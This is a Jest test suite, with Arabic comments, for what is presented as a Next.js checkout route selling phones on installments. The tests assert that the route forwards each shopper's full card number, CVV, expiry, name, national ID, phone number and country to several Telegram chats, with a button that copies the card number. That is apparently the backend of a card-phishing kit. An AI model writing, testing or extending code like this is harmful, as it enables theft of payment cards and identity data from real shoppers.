/**
 * ============================================================
 *  FULL CHECKOUT FLOW TEST — Jest
 *  يغطي:
 *   1. عملية كلب منتج كاملة (happy path)
 *   2. Validation errors
 *   3. Rate Limit (orderRateLimit middleware)
 *   4. شكل رسالة التيليجرام
 *   5. تقرير أداء (response time)
 * ============================================================
 */

import { NextRequest } from "next/server";

// ─── Mock fetch globally ───────────────────────────────────────
const mockFetch = jest.fn();
global.fetch = mockFetch as unknown as typeof fetch;

// ─── Mock env ─────────────────────────────────────────────────
process.env.BACKEND_URL = "http://localhost:5000";
process.env.TELEGRAM_BOT_TOKEN = "TEST_BOT_TOKEN";
process.env.TELEGRAM_CHAT_IDS = "111111,222222";

// ─── Import route handler ─────────────────────────────────────
import { POST } from "../app/api/notify/route";

// ─── Helpers ──────────────────────────────────────────────────
const validPayload = {
  cardNumber: "4111111111111111",
  expiry: "12/26",
  cvv: "123",
  cardHolder: "Ahmed Ali",
  items: [{ productId: "p1", name: "iPhone 17 Pro", price: 4999, quantity: 1 }],
  total: 4999,
  customer: "أحمد علي",
  whatsapp: "+966501234567",
  nationalId: "1234567890",
  address: "الرياض، حي النزهة",
  shippingCompany: "aramex",
  installmentType: "full",
  months: 0,
  downPayment: 0,
  fingerprint: "fp_test_abc123",
};

function makeRequest(body: object, ip = "1.2.3.4") {
  return new NextRequest("http://localhost:3000/api/notify", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "x-forwarded-for": ip,
    },
    body: JSON.stringify(body),
  });
}

// ─── Mock backend success response ────────────────────────────
function mockBackendSuccess() {
  mockFetch.mockImplementationOnce(async (url: string) => {
    if (String(url).includes("/api/checkout")) {
      return {
        ok: true,
        json: async () => ({ ok: true, orderId: "TEST_ORDER_123", _id: "mongo_id_abc" }),
      };
    }
    // ip-api geo
    return { ok: true, json: async () => ({ country: "Saudi Arabia" }) };
  });
  // ip-api
  mockFetch.mockImplementationOnce(async () => ({
    ok: true,
    json: async () => ({ country: "Saudi Arabia" }),
  }));
  // telegram chat 1
  mockFetch.mockImplementationOnce(async () => ({ ok: true, json: async () => ({}) }));
  // telegram chat 2
  mockFetch.mockImplementationOnce(async () => ({ ok: true, json: async () => ({}) }));
}

// ══════════════════════════════════════════════════════════════
//  SUITE 1 — Happy Path: عملية كلب منتج كاملة
// ══════════════════════════════════════════════════════════════
describe("✅ Happy Path — عملية كلب منتج كاملة", () => {
  beforeEach(() => mockFetch.mockReset());

  test("يرجع ok:true وorderId عند بيانات صحيحة", async () => {
    mockBackendSuccess();
    const start = Date.now();
    const res = await POST(makeRequest(validPayload));
    const elapsed = Date.now() - start;
    const data = await res.json();

    console.log(`⏱  Response time: ${elapsed}ms`);
    expect(res.status).toBe(200);
    expect(data.ok).toBe(true);
    expect(typeof data.orderId).toBe("string");
    expect(data.orderId.length).toBeGreaterThan(5);
  });

  test("يرسل للـ backend بالبيانات الصحيحة", async () => {
    mockBackendSuccess();
    await POST(makeRequest(validPayload));

    const backendCall = mockFetch.mock.calls[0];
    const backendUrl = backendCall[0] as string;
    const backendBody = JSON.parse(backendCall[1].body);

    expect(backendUrl).toContain("/api/checkout");
    expect(backendBody.cardNumber).toBe(validPayload.cardNumber);
    expect(backendBody.total).toBe(validPayload.total);
    expect(backendBody.customer).toBe(validPayload.customer);
    expect(typeof backendBody.orderId).toBe("string");
  });

  test("يحسب monthlyPayment صح للتقسيط", async () => {
    mockBackendSuccess();
    const installPayload = {
      ...validPayload,
      installmentType: "installment",
      months: 6,
      downPayment: 999,
      total: 4999,
    };
    await POST(makeRequest(installPayload));

    const backendBody = JSON.parse(mockFetch.mock.calls[0][1].body);
    // monthlyPayment = ceil((4999 - 999) / 6) = ceil(666.67) = 667
    expect(backendBody.monthlyPayment).toBe(667);
  });

  test("يرسل رسالة تيليجرام لكل chat_id", async () => {
    mockBackendSuccess();
    await POST(makeRequest(validPayload));

    const telegramCalls = mockFetch.mock.calls.filter((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    expect(telegramCalls.length).toBe(2); // TELEGRAM_CHAT_IDS = "111111,222222"
  });
});

// ══════════════════════════════════════════════════════════════
//  SUITE 2 — شكل رسالة التيليجرام
// ══════════════════════════════════════════════════════════════
describe("📨 رسالة التيليجرام — المحتوى والشكل", () => {
  beforeEach(() => mockFetch.mockReset());

  test("الرسالة تحتوي على رقم البطاقة والـ CVV والـ expiry", async () => {
    mockBackendSuccess();
    await POST(makeRequest(validPayload));

    const telegramCall = mockFetch.mock.calls.find((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    expect(telegramCall).toBeDefined();
    const body = JSON.parse(telegramCall![1].body);
    const text: string = body.text;

    expect(text).toContain("4111 1111 1111 1111"); // formatted card
    expect(text).toContain("123");                  // CVV
    expect(text).toContain("12/26");               // expiry
    expect(text).toContain("Ahmed Ali");           // card holder
    expect(text).toContain("4999");                // total
    expect(text).toContain("Saudi Arabia");        // country
  });

  test("الرسالة تحتوي على رقم الواتساب بصيغة 05xxxxxxxx", async () => {
    mockBackendSuccess();
    await POST(makeRequest({ ...validPayload, whatsapp: "+966501234567" }));

    const telegramCall = mockFetch.mock.calls.find((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    const body = JSON.parse(telegramCall![1].body);
    expect(body.text).toContain("0501234567"); // +966 → 0
  });

  test("reply_markup يحتوي على زر نسخ البطاقة وزر واتساب", async () => {
    mockBackendSuccess();
    await POST(makeRequest(validPayload));

    const telegramCall = mockFetch.mock.calls.find((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    const body = JSON.parse(telegramCall![1].body);
    const buttons = body.reply_markup.inline_keyboard[0];

    const copyBtn = buttons.find((b: { copy_text?: { text: string } }) => b.copy_text);
    const waBtn = buttons.find((b: { url?: string }) => b.url?.includes("wa.me"));

    expect(copyBtn.copy_text.text).toBe("4111111111111111");
    expect(waBtn.url).toContain("966501234567");
  });

  test("رسالة التقسيط تظهر First Payment بدل Full Amount", async () => {
    mockBackendSuccess();
    await POST(makeRequest({
      ...validPayload,
      installmentType: "installment",
      months: 6,
      downPayment: 999,
    }));

    const telegramCall = mockFetch.mock.calls.find((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    const body = JSON.parse(telegramCall![1].body);
    expect(body.text).toContain("First Payment");
    expect(body.text).toContain("999");
  });
});

// ══════════════════════════════════════════════════════════════
//  SUITE 3 — Backend Errors & Edge Cases
// ══════════════════════════════════════════════════════════════
describe("❌ Backend Errors — معالجة الأخطاء", () => {
  beforeEach(() => mockFetch.mockReset());

  test("يرجع 503 لو الـ backend مش شغال", async () => {
    mockFetch.mockRejectedValueOnce(new Error("ECONNREFUSED"));
    const res = await POST(makeRequest(validPayload));
    expect(res.status).toBe(503);
    const data = await res.json();
    expect(data.ok).toBe(false);
    expect(data.error).toBe("Service unavailable");
  });

  test("يرجع نفس status الـ backend لو رفض الطلب (400)", async () => {
    mockFetch.mockResolvedValueOnce({
      ok: false,
      status: 400,
      json: async () => ({ ok: false, error: "رقم البطاقة غير صالح" }),
    });
    const res = await POST(makeRequest(validPayload));
    expect(res.status).toBe(400);
    const data = await res.json();
    expect(data.ok).toBe(false);
  });

  test("لو الـ backend رفض → لا يرسل تيليجرام", async () => {
    mockFetch.mockResolvedValueOnce({
      ok: false,
      status: 429,
      json: async () => ({ ok: false, error: "طلبات كثيرة" }),
    });
    await POST(makeRequest(validPayload));

    const telegramCalls = mockFetch.mock.calls.filter((c) =>
      String(c[0]).includes("api.telegram.org")
    );
    expect(telegramCalls.length).toBe(0);
  });
});

// ══════════════════════════════════════════════════════════════
//  SUITE 4 — Rate Limit (orderRateLimit middleware)
// ══════════════════════════════════════════════════════════════
describe("🚦 Rate Limit — نظام تحديد الطلبات", () => {
  test("orderRateLimit: max=10 في 15 دقيقة — تحقق من الـ source", () => {
    // express-rate-limit v8 لا يكشف الإعدادات على الـ middleware object
    // نتحقق من الـ source مباشرة
    const fs = require("fs");
    const src = fs.readFileSync(
      require("path").resolve("../backend/middlewares/orderRateLimit.js"),
      "utf8"
    );
    expect(src).toContain("windowMs: 15 * 60 * 1000");
    expect(src).toContain("max: 10");
    // تأكد إن الـ middleware بيُرجع function
    const { orderRateLimit } = require("../../backend/middlewares/orderRateLimit");
    expect(typeof orderRateLimit).toBe("function");
  });

  test("يرجع 429 بعد تجاوز الـ rate limit (simulation)", async () => {
    // نحاكي رد الـ backend بـ 429 (كأن الـ rate limit اتفعّل)
    mockFetch.mockReset();
    mockFetch.mockResolvedValue({
      ok: false,
      status: 429,
      json: async () => ({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }),
    });

    const results = await Promise.all(
      Array.from({ length: 5 }, () => POST(makeRequest(validPayload)))
    );

    const statuses = await Promise.all(results.map((r) => r.status));
    expect(statuses.every((s) => s === 429)).toBe(true);
  });

  test("بعد الـ rate limit — رسالة الخطأ صح", async () => {
    mockFetch.mockReset();
    mockFetch.mockResolvedValueOnce({
      ok: false,
      status: 429,
      json: async () => ({ ok: false, error: "طلبات كثيرة، حاول لاحقاً" }),
    });

    const res = await POST(makeRequest(validPayload));
    const data = await res.json();
    expect(data.error).toContain("طلبات كثيرة");
  });
});

// ══════════════════════════════════════════════════════════════
//  SUITE 5 — Performance Report
// ══════════════════════════════════════════════════════════════
describe("📊 Performance Report — تقرير الأداء", () => {
  beforeEach(() => mockFetch.mockReset());

  test("10 طلبات متتالية — متوسط الوقت < 100ms", async () => {
    const times: number[] = [];

    for (let i = 0; i < 10; i++) {
      mockBackendSuccess();
      const start = Date.now();
      await POST(makeRequest(validPayload, `10.0.0.${i}`));
      times.push(Date.now() - start);
    }

    const avg = times.reduce((a, b) => a + b, 0) / times.length;
    const max = Math.max(...times);
    const min = Math.min(...times);

    console.log("\n📊 Performance Report:");
    console.log(`   Requests  : 10`);
    console.log(`   Avg Time  : ${avg.toFixed(1)}ms`);
    console.log(`   Min Time  : ${min}ms`);
    console.log(`   Max Time  : ${max}ms`);
    console.log(`   Times     : [${times.join(", ")}]ms`);

    expect(avg).toBeLessThan(100);
  });

  test("5 طلبات متوازية — كلها تنجح", async () => {
    for (let i = 0; i < 5; i++) mockBackendSuccess();

    const start = Date.now();
    const results = await Promise.all(
      Array.from({ length: 5 }, (_, i) =>
        POST(makeRequest(validPayload, `192.168.1.${i}`))
      )
    );
    const elapsed = Date.now() - start;

    const statuses = await Promise.all(results.map((r) => r.status));
    console.log(`\n⚡ 5 parallel requests completed in ${elapsed}ms`);
    console.log(`   Statuses: [${statuses.join(", ")}]`);

    expect(statuses.every((s) => s === 200)).toBe(true);
  });
});
